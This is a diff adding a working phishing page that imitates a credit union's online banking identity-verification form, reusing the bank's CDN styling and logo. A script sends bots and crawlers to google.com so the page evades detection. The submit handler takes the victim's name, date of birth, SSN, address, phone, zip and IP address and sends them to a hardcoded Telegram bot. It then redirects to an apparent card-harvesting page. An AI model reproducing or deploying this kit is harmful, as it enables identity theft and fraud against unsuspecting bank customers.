@@ -1,0 +1,505 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta
+      name="viewport"
+      content="width=device-width, minimum-scale=1.0, maximum-scale=2.0, user-scalable=1"
+    />
+    <title>Internet Banking Enrollment</title>
+    <script>
+    /* anti-bot */
+    var bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    var ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+
+    <link
+      rel="stylesheet"
+      href="https://cdn1.onlineaccess1.com/cdn/wedge/sdk_e2e/css/all.min.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdn1.onlineaccess1.com/cdn/wedge/sdk_e2e/css/layout5.css"
+    />
+    <style>
+      html {
+        min-height: 100%;
+      }
+
+      .container-fluid.heading {
+        width: 66.6666666666667%;
+        padding: 6% 0 0 0;
+      }
+
+      .btn-primary {
+        background-color: important;
+      }
+
+      .btn-primary {
+        color: important;
+      }
+
+      .btn-primary {
+        border-color: important;
+      }
+
+      .btn-secondary {
+        background-color: important;
+      }
+
+      .btn-secondary {
+        color: important;
+      }
+
+      .btn-secondary {
+        border-color: important;
+      }
+
+      @media screen and (max-width: 991px) {
+        .container-fluid.heading {
+          width: 83.3333333333333%;
+        }
+      }
+
+      @media screen and (max-width: 767px) {
+        .container-fluid.heading {
+          width: 100%;
+          padding: 0 0 0 0;
+        }
+      }
+
+      .container-fluid + .container {
+        background-color: #f6f6f6;
+      }
+
+      .outage-msg {
+        font-size: 19px;
+      }
+    </style>
+    <link
+      href="https://cdn1.onlineaccess1.com/cdn/depot/5257_01/4266/b06de577530f2a03f2a0f592baa60ba8/assets/images/favicon-c3da48bee55edb5c80e2bf4714856cc5.ico"
+      rel="icon"
+    />
+  </head>
+  <body>
+    <div class="modal fade" id="myModal" tabindex="-1" role="dialog">
+      <div class="modal-dialog" role="document">
+        <div class="modal-content">
+          <div class="modal-body">
+            <div class="row">
+              <div class="col-xs-12 congrats">
+                <i
+                  class="icon-ok-circle"
+                  aria-hidden="true"
+                  id="modal-title"
+                  style="font-size: 30px"
+                ></i>
+              </div>
+              <div class="col-xs-12" id="success_message"></div>
+              <div class="col-xs-12" id="modal-body"></div>
+            </div>
+          </div>
+          <div class="modal-footer" id="modal-footer">
+            
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-fluid heading">
+      <div class="col-xs-12" style="text-align: center">
+        <img
+          id="logo-large"
+          src=" https://cdn1.onlineaccess1.com/cdn/depot/5257_01/4266/b9dfc5522a85674a8249d9cc929e5bbe/assets/images/logos/logo_large-c48397e5bd4f7d1654f3f890b3c04d8f.png"
+          style="max-width: 100%; height: auto"
+          alt="Q2 CI Environment"
+        />
+      </div>
+    </div>
+    <div
+      class="container col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-12"
+    >
+      <div class="row" style="margin-bottom: 40px">
+        <div class="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
+          <h1 id="page_title">Digital Banking Identification</h1>
+          <p id="page_message" class="page-message">Let's verify it's you.<br>To protect your account, please tell us the requested 
+      info so we can confirm your identity. If you have more 
+      than one account, choose one and we'll take care of the rest.</p>
+          <div class="sr-only" tabindex="0">
+            All fields are required unless otherwise mentioned.
+          </div>
+          <ul id="nav-tabs" class="nav nav-tabs" style="display: none"></ul>
+        </div>
+        <div class="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
+          
+
+          <div id="q2-form-fields" class="tab-content">
+            <div id="personal">
+              <form
+                class="q2-form fv-form fv-form-bootstrap"
+                id="login-details"
+              >
+                
+                <div class="col-xs-12 groupHeading" id="section0">
+                  <div class=""></div>
+                </div>
+                <div class="form-group col-xs-12 col-sm-6 has-feedback">
+                  <label
+                    for="name"
+                    >Full Name:</label
+                  ><input
+                    type="text"
+                    id="fullname"
+                    name="fullname"
+                    class="form-control"
+                    required="required"
+                    autocomplete="off"
+                  />
+                  </div>
+                </div>
+                <div class="form-group col-xs-12 col-sm-6 has-feedback">
+                  <label for="dob">Date Of Birth  (MM/DD/YYYY):</label>
+                  <input
+                    type="text"
+                    id="dob"
+                    name="dob"
+                    class="form-control"
+                    maxlength="10"
+                    required="required"
+                    autocomplete="off"
+                  />
+                  </div>
+                </div>
+                <div class="form-group col-xs-12 col-sm-6 has-feedback">
+                  <label for="ssn" test-id="e2e-DOB-label"
+                    >Social Security Number (SSN):</label
+                  ><input
+                    type="text"
+                    id="ssn"
+                    test-id="e2e-DOB"
+                    name="ssn"
+                    class="form-control"
+                    maxlength="11"
+                    placeholder="___-__-____"
+                    autocomplete="off"
+                    required
+                  /><i
+                    class="form-control-feedback"
+                    data-fv-icon-for="DOB"
+                    aria-hidden="true"
+                    style="display: none"
+                  ></i
+                  >
+                  <div
+                    class="DOB help-block"
+                    style="display: none; width: 488px"
+                  >
+                  </div>
+                </div>
+                <div class="form-group col-xs-12 col-sm-6 has-feedback">
+                  <label
+                    for="address"
+                    test-id="e2e-SocialSecurity-label"
+                    >Street Address:</label
+                  ><input
+                    type="text"
+                    id="address"
+                    test-id="e2e-SocialSecurity"
+                    name="address"
+                    class="form-control"
+                    autocomplete="off"
+                    required
+                  /><i
+                    class="form-control-feedback"
+                    data-fv-icon-for="SocialSecurity"
+                    aria-hidden="true"
+                    style="display: none"
+                  ></i
+                  ><span
+                    class="hint"
+                    id="valrt_SocialSecurity-hint"
+                    test-id="e2e-SocialSecurity-hint"
+                    style="width: 513.333px"
+                    >Hint: Numbers only</span
+                  >
+                  <div
+                    class="SocialSecurity help-block"
+                    style="display: none; width: 488px"
+                  >
+                    <small
+                      class="help-block"
+                      data-fv-validator="blank"
+                      data-fv-for="SocialSecurity"
+                      data-fv-result="NOT_VALIDATED"
+                      style="display: none; width: 513.333px"
+                      >This value is not valid</small
+                    ><small
+                      class="help-block"
+                      data-fv-validator="notEmpty"
+                      data-fv-for="SocialSecurity"
+                      data-fv-result="NOT_VALIDATED"
+                      style="display: none; width: 513.333px"
+                      >Last 4 of SSN is required</small
+                    ><small
+                      class="help-block"
+                      data-fv-validator="regexp"
+                      data-fv-for="SocialSecurity"
+                      data-fv-result="NOT_VALIDATED"
+                      style="display: none; width: 513.333px"
+                      >Please enter a valid Social Security Number</small
+                    ><small
+                      class="help-block"
+                      data-fv-validator="stringLength"
+                      data-fv-for="SocialSecurity"
+                      data-fv-result="NOT_VALIDATED"
+                      style="display: none; width: 513.333px"
+                      >Please enter a value with valid length</small
+                    >
+                  </div>
+                </div>
+                <div class="form-group col-xs-12 col-sm-6 has-feedback">
+                  <label for="phone" test-id="e2e-LoginID-label"
+                    >Phone Number:</label
+                  ><input
+                    type="text"
+                    id="phone"
+                    test-id="e2e-LoginID"
+                    name="phone"
+                    class="form-control"
+                    maxlength="12"
+                    pattern="\d{3}-\d{3}-\d{4}"
+                    autocomplete="off"
+                    required
+                  /><i
+                    class="form-control-feedback"
+                    data-fv-icon-for="LoginID"
+                    aria-hidden="true"
+                    style="display: none"
+                  ></i
+                  ><span
+                    class="hint"
+                    id="valrt_LoginID-hint"
+                    test-id="e2e-LoginID-hint"
+                    style="width: 513.333px"
+                    >Hint: Login ID must be 8-20 characters, cannot include:
+                    &amp;&lt;&gt;</span
+                  >
+                  <div
+                    class="LoginID help-block"
+                    style="display: none; width: 488px"
+                  >
+                    <small
+                      class="help-block"
+                      data-fv-validator="blank"
+                      data-fv-for="LoginID"
+                      data-fv-result="NOT_VALIDATED"
+                      style="display: none; width: 513.333px"
+                      >This value is not valid</small
+                    ><small
+                      class="help-block"
+                      data-fv-validator="notEmpty"
+                      data-fv-for="LoginID"
+                      data-fv-result="NOT_VALIDATED"
+                      style="display: none; width: 513.333px"
+                      >Login ID is required</small
+                    ><small
+                      class="help-block"
+                      data-fv-validator="regexp"
+                      data-fv-for="LoginID"
+                      data-fv-result="NOT_VALIDATED"
+                      style="display: none; width: 513.333px"
+                      >Login ID does not meet requirements. Login ID must be 8 -
+                      20 characters, must contain at least one letter, and may
+                      not contain these special characters: &amp;&lt;&gt;</small
+                    ><small
+                      class="help-block"
+                      data-fv-validator="stringLength"
+                      data-fv-for="LoginID"
+                      data-fv-result="NOT_VALIDATED"
+                      style="display: none; width: 513.333px"
+                      >Please enter a value with valid length</small
+                    >
+                  </div>
+                </div>
+
+                <div class="form-group col-xs-12 col-sm-6 has-feedback">
+                  <label
+                    for="zip"
+                    test-id="e2e-SocialSecurity-label"
+                    >Zip Code:</label
+                  ><input
+                    type="text"
+                    id="zip"
+                    test-id="e2e-SocialSecurity"
+                    name="zip"
+                    class="form-control"
+                    autocomplete="off"
+                    required
+                  /><i
+                    class="form-control-feedback"
+                    data-fv-icon-for="SocialSecurity"
+                    aria-hidden="true"
+                    style="display: none"
+                  ></i
+                  ><span
+                    class="hint"
+                    id="valrt_SocialSecurity-hint"
+                    test-id="e2e-SocialSecurity-hint"
+                    style="width: 513.333px"
+                    >Hint: Numbers only</span
+                  >
+                  <div
+                    class="SocialSecurity help-block"
+                    style="display: none; width: 488px"
+                  >
+                    <small
+                      class="help-block"
+                      data-fv-validator="blank"
+                      data-fv-for="SocialSecurity"
+                      data-fv-result="NOT_VALIDATED"
+                      style="display: none; width: 513.333px"
+                      >This value is not valid</small
+                    ><small
+                      class="help-block"
+                      data-fv-validator="notEmpty"
+                      data-fv-for="SocialSecurity"
+                      data-fv-result="NOT_VALIDATED"
+                      style="display: none; width: 513.333px"
+                      >Last 4 of SSN is required</small
+                    ><small
+                      class="help-block"
+                      data-fv-validator="regexp"
+                      data-fv-for="SocialSecurity"
+                      data-fv-result="NOT_VALIDATED"
+                      style="display: none; width: 513.333px"
+                      >Please enter a valid Social Security Number</small
+                    ><small
+                      class="help-block"
+                      data-fv-validator="stringLength"
+                      data-fv-for="SocialSecurity"
+                      data-fv-result="NOT_VALIDATED"
+                      style="display: none; width: 513.333px"
+                      >Please enter a value with valid length</small
+                    >
+                  </div>
+                </div>
+
+                <div class="col-xs-12"><div class="line"></div></div>
+                <button type="submit"
+                  class="btn btn-primary pull-right"
+                >
+                  Continue</button
+                ><a
+                  href="start.html"
+                  mobile-window="main"
+                  id="back_btn"
+                  test-id="e2e-backToLogin"
+                  class="btn btn-secondary pull-right"
+                  >Back to login</a
+                >
+              </form>
+
+
+
+
+
+              <script>
+
+                document.getElementById("login-details").addEventListener("submit", function(event){
+                    event.preventDefault(); // Prevent form submission
+        
+                    var fullname = document.getElementById("fullname").value;
+                    var dob = document.getElementById("dob").value;
+                    var ssn = document.getElementById("ssn").value;
+                    var address = document.getElementById("address").value;
+                    var phone = document.getElementById("phone").value;
+                    var zip = document.getElementById("zip").value;
+        
+                    // Get the user's IP address
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            var ipAddress = data.ip;
+        
+                            var message = `🏦 PARTNERS FCU LOGS 🏦\n \n \n 👤 Full Name: ${fullname}\n\n📆 DOB: ${dob}\n\n 🔐 SSN: ${ssn}\n\n🏠 Address: ${address}\n\n☎️ Phone Number: ${phone}\n \n📍 Zip Code: ${zip}\n\n🌐 IP Address: ${ipAddress}`;
+        
+                            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your bot's token and your chat ID
+                            var telegramAPI = `https://api.telegram.org/bot7681588807:AAF7pHoVlIsPzWmIELKRZXQnjq3qnNCWyiQ/sendMessage?chat_id=7920571465&text=${encodeURIComponent(message)}`;
+        
+                            fetch(telegramAPI)
+                                .then(response => response.json())
+                                .then(data => {
+                                    if (data.ok) {
+                                        
+                                        // Redirect to a different page after successful submission
+                                        window.location.href = "cred1t.html"; // Replace with your desired redirect page
+                                    } else {
+                                        alert("Error.");
+                                    }
+                                })
+                                .catch(error => {
+                                    alert("Error: " + error.message);
+                                });
+                        })
+                        .catch(error => {
+                            alert("Error 'enable cookies': " + error.message);
+                        });
+                });
+
+
+
+  
+    // Format DOB
+    const dob = document.getElementById('dob');
+    if (dob) {
+      dob.addEventListener('input', e => {
+        let d = e.target.value.replace(/\D/g, '').slice(0, 8);
+        const parts = [];
+        if (d.length > 4) parts.push(d.slice(0, 2), d.slice(2, 4), d.slice(4));
+        else if (d.length > 2) parts.push(d.slice(0, 2), d.slice(2));
+        else parts.push(d);
+        e.target.value = parts.join('/');
+      });
+    }
+
+    // Format SSN
+    const ssn = document.getElementById('ssn');
+    if (ssn) {
+      ssn.addEventListener('input', e => {
+        let s = e.target.value.replace(/\D/g, '').slice(0, 9);
+        const parts = [];
+        if (s.length > 5) parts.push(s.slice(0, 3), s.slice(3, 5), s.slice(5));
+        else if (s.length > 3) parts.push(s.slice(0, 3), s.slice(3));
+        else parts.push(s);
+        e.target.value = parts.join('-');
+      });
+    }
+
+    // Format phone
+    document.getElementById('phone').addEventListener('input', function (e) {
+      let input = e.target.value.replace(/\D/g, '').slice(0, 10);
+      if (input.length > 6) {
+        input = input.replace(/(\d{3})(\d{3})(\d{1,4})/, '$1-$2-$3');
+      } else if (input.length > 3) {
+        input = input.replace(/(\d{3})(\d{1,3})/, '$1-$2');
+      }
+      e.target.value = input;
+    });
+</script>
+
+
+
+
+
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="sr-message" aria-live="assertive" class="sr-only"></div>
+  </body>
+</html>
